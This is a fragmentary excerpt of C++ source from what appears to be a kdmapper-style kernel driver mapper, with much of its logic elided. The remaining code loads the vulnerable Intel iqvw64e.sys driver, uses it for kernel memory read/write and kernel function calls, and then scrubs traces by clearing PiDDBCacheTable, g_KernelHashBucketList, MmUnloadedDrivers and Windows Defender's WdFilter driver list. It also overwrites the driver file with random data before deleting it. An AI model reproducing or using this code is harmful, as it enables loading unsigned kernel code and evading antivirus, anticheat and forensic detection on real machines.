...
bool intel_driver::AcquireDebugPrivilege() {
	...
	if (!NT_SUCCESS(Status)) {
		log_dbg("[-] Failed to acquire SE_DEBUG_PRIVILEGE" );
		return false;
	}
...
HANDLE intel_driver::Load() {
	...
	if (intel_driver::IsRunning()) {
		log_dbg("[-] \\Device\\Nal is already in use." );
		return INVALID_HANDLE_VALUE;
	}

	//Randomize name for log_dbg in registry keys, usn jornal and other shits
	...
	std::wstring name = GetDriverNameW();
	log_dbg("[<] Loading vulnerable driver, Name: %ls", name.c_str());

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		log_dbg("[-] Can't find TEMP folder" );
		return INVALID_HANDLE_VALUE;
	}
	...
	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		log_dbg("[-] Failed to create vulnerable driver file" );
		return INVALID_HANDLE_VALUE;
	}

	if (!AcquireDebugPrivilege()) {
		log_dbg("[-] Failed to acquire SeDebugPrivilege" );
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	if (!service::RegisterAndStart(driver_path)) {
		log_dbg("[-] Failed to register and start service for the vulnerable driver" );
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}
	...
	{
		log_dbg("[-] Failed to load driver iqvw64e.sys" );
	...
	if (ntoskrnlAddr == 0) {
		log_dbg("[-] Failed to get ntoskrnl.exe" );
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	...
	if (!intel_driver::ReadMemory(result, intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		log_dbg("[-] Can't exploit intel driver, is there any antivirus or anticheat running?" );
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearPiDDBCacheTable(result)) {
		log_dbg("[-] Failed to ClearPiDDBCacheTable" );
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearKernelHashBucketList(result)) {
		log_dbg("[-] Failed to ClearKernelHashBucketList" );
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
		log_dbg("[!] Failed to ClearMmUnloadedDrivers" );
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearWdFilterDriverList(result)) {
		log_dbg("[!] Failed to ClearWdFilterDriverList" );
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
...
bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {
	...
	if (!WdFilter) {
		log_dbg("[+] WdFilter.sys not loaded, clear skipped" );
		return true;
	}
	...
	if (!MpBmDocOpenRules)
	{
		log_dbg("[-] Failed To Get MpBmDocOpenRules." );
		return false;
	}
	...
	{
		log_dbg("[-] Failed To Get MpFreeDriverInfoEx." );
		return false;
	}
	...
	if (!RuntimeDriversList) {
		log_dbg("[!] Failed to find WdFilter RuntimeDriversList");
		return false;
	}
	...
	if (!RuntimeDriversCountRef) {
		log_dbg("[!] Failed to find WdFilter RuntimeDriversCount");
		return false;
	}
	...
	*/
	...
	if (!MpFreeDriverInfoExRef) {
		...
		*/
		...
		if (!MpFreeDriverInfoExRef) {
			log_dbg("[!] Failed to find WdFilter MpFreeDriverInfoEx" );
			return false;
		}
		else {
			log_dbg("[+] Found WdFilter MpFreeDriverInfoEx with second pattern" );
		}
			...
			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {
					...
					if (!removedRuntimeDriversArray) {
						log_dbg("[!] Failed to remove from RuntimeDriversArray" );
						return false;
					}
					...
					if (Magic != 0xDA18) {
						log_dbg("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" );
					}
					else {
						CallKernelFunction<void>(device_handle, nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					log_dbg("[+] WdFilterDriverList Cleaned: ", ImageName.get());
					return true;
				}
			}
		}
...
bool intel_driver::Unload(HANDLE device_handle) {
	log_dbg("[<] Unloading vulnerable driver" );
	...
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		log_dbg("[!] Error dumping shit inside the disk" );
	}
	else {
		log_dbg("[+] Vul driver data destroyed before unlink" );
	}
	file_ofstream.close();
	delete[] randomData;
...
bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
	...
	if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
		log_dbg("[-] Failed to translate virtual address 0x", reinterpret_cast<void*>(address) );
		return false;
	}
	...
	if (!mapped_physical_memory) {
		log_dbg("[-] Failed to map IO space of 0x", reinterpret_cast<void*>(physical_address) );
		return false;
	}
	...
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		log_dbg("[!] Failed to unmap IO space of physical address 0x", reinterpret_cast<void*>(physical_address) );
#endif
...
uint64_t intel_driver::MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size)
{
	...
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		...
		if (!kernel_MmAllocateIndependentPagesEx) {
			log_dbg("[!] Failed to find MmAllocateIndependentPagesEx" );
			return 0;
		}
...
bool intel_driver::MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size)
{
	...
	if (!kernel_MmFreeIndependentPages)
	{
		...
		if (!kernel_MmFreeIndependentPages) {
			log_dbg("[!] Failed to find MmFreeIndependentPages" );
			return false;
		}
...
BOOLEAN intel_driver::MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
		log_dbg("[!] Invalid address passed to MmSetPageProtection" );
		return FALSE;
	}
	...
	if (!kernel_MmSetPageProtection)
	{
		...
		if (!kernel_MmSetPageProtection) {
			log_dbg("[!] Failed to find MmSetPageProtection" );
			return FALSE;
		}
...
uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
	...
	if (!kernel_ExAllocatePool) {
		log_dbg("[!] Failed to find ExAllocatePool" );
		return 0;
	}
...
uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name) {
	...
	for (auto i = 0u; i < export_data->NumberOfNames; ++i)
	{
		...
		if (!_stricmp(function_name_buffer, function_name.c_str()))
		{
			const auto function_ordinal = ordinal_table[i];
			const auto function_rva = function_table[function_ordinal];

			return kernel_module_base + function_rva;
		}
	}
...
bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	...
	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		log_dbg("[!] Failed to find device_object" );
		return false;
	}
	...
	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		log_dbg("[!] Failed to find driver_object" );
		return false;
	}
	...
	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		log_dbg("[!] Failed to find driver_section" );
		return false;
	}
	...
	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		log_dbg("[!] Failed to find driver name" );
		return false;
	}
	...
	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		log_dbg("[!] Failed to read driver name" );
		return false;
	}
	...
	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		log_dbg("[!] Failed to write driver name length" );
		return false;
	}

	log_dbg("[+] MmUnloadedDrivers Cleaned: ", unloadedName.get());
	return true;
}
...
bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait) {
	...
	if (!kernel_ExAcquireResourceExclusiveLite) {
		log_dbg("[!] Failed to find ExAcquireResourceExclusiveLite" );
		return 0;
	}
...
bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource) {
	...
	if (!kernel_ExReleaseResourceLite) {
		log_dbg("[!] Failed to find ExReleaseResourceLite" );
		return false;
	}
...
BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer) {
	...
	if (!kernel_RtlDeleteElementGenericTableAvl) {
		log_dbg("[!] Failed to find RtlDeleteElementGenericTableAvl" );
		return false;
	}
...
PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
	...
	if (!kernel_RtlDeleteElementGenericTableAvl) {
		log_dbg("[!] Failed to find RtlLookupElementGenericTableAvl" );
		return nullptr;
	}
...
bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
	...
	if (!PiDDBLockOffset)
	{
		log_dbg("[-] Warning PiDDBLock not found" );
		return false;
	}
	...
	if (!PiDDBLockOffset)
	{
		log_dbg("[-] Warning PiDDBCacheTable not found" );
		return false;
	}
	...
	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as possible
		...
		if (PiDDBLockPtr == NULL) {
			...
			if (PiDDBLockPtr == NULL) {
				...
				log_dbg("[+] PiDDBLock found with third pattern" );
				PiDDBLockPtr += 19;//third pattern offset
			}
		}
		else {
			log_dbg("[+] PiDDBLock found with second pattern" );
	...
	if (PiDDBCacheTablePtr == NULL) {
		...
		if (PiDDBCacheTablePtr == NULL) {
			...
			log_dbg("[+] PiDDBCacheTable found with second pattern" );
			PiDDBCacheTablePtr += 2;//second pattern offset
		}
	}

	log_dbg("[+] PiDDBLock Ptr 0x%X", PiDDBLockPtr );
	log_dbg("[+] PiDDBCacheTable Ptr 0x%X", PiDDBCacheTablePtr );
	...
	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		log_dbg("[-] Can't lock PiDDBCacheTable" );
		return false;
	}
	log_dbg("[+] PiDDBLock Locked" );
	...
	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		log_dbg("[-] Can't delete from PiDDBCacheTable" );
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	...
	log_dbg("[+] PiDDBCacheTable Cleaned" );
...
bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	...
	if (!ci) {
		log_dbg("[-] Can't Find ci.dll module address" );
		return false;
	}
	...
	{
		log_dbg("[-] Can't Find g_KernelHashBucketList Offset" );
		return false;
	}
	...
	if (!g_KernelHashBucketListOffset)
	{
		log_dbg("[-] Can't Find g_HashCacheLock Offset" );
		return false;
	}
	...
	if (!g_HashCacheLock)
	{
		log_dbg("[-] Can't Find g_HashCache relative address" );
		return false;
	}
#endif

	log_dbg("[+] g_KernelHashBucketList Found 0x%X", g_KernelHashBucketList );

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		log_dbg("[-] Can't lock g_HashCacheLock" );
		return false;
	}
	log_dbg("[+] g_HashCacheLock Locked" );
	...
	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
		log_dbg("[-] Failed to read first g_KernelHashBucketList entry!" );
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
		}
		return false;
	}
	if (!entry) {
		log_dbg("[!] g_KernelHashBucketList looks empty!" );
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
		}
		return true;
	...
	while (entry) {
		...
		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			log_dbg("[-] Failed to read g_KernelHashBucketList entry text len!" );
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
			}
			return false;
		...
		if (expected_len == wsNameLen) {
			...
			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				log_dbg("[-] Failed to read g_KernelHashBucketList entry text ptr!" );
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
				}
				return false;
			...
			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				log_dbg("[-] Failed to read g_KernelHashBucketList entry text!" );
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
				}
				return false;
			...
			if (find_result != std::wstring::npos) {
				std::wstring tmp(&wsName[find_result]);
				std::string name(tmp.begin(), tmp.end());
				log_dbg("[+] Found In g_KernelHashBucketList: %s", name.c_str());
				HashBucketEntry* Next = 0;
				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
					log_dbg("[-] Failed to read g_KernelHashBucketList next entry ptr!" );
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
					}
					return false;
				...
				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
					log_dbg("[-] Failed to write g_KernelHashBucketList prev entry ptr!" );
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
					}
					return false;
				...
				if (!FreePool(device_handle, (uintptr_t)entry)) {
					log_dbg("[-] Failed to clear g_KernelHashBucketList entry pool!" );
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
					}
					return false;
				}
				log_dbg("[+] g_KernelHashBucketList Cleaned" );
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
		...
		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
			log_dbg("[-] Failed to read g_KernelHashBucketList next entry!" );
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				log_dbg("[-] Failed to release g_KernelHashBucketList lock!" );
			}
			return false;
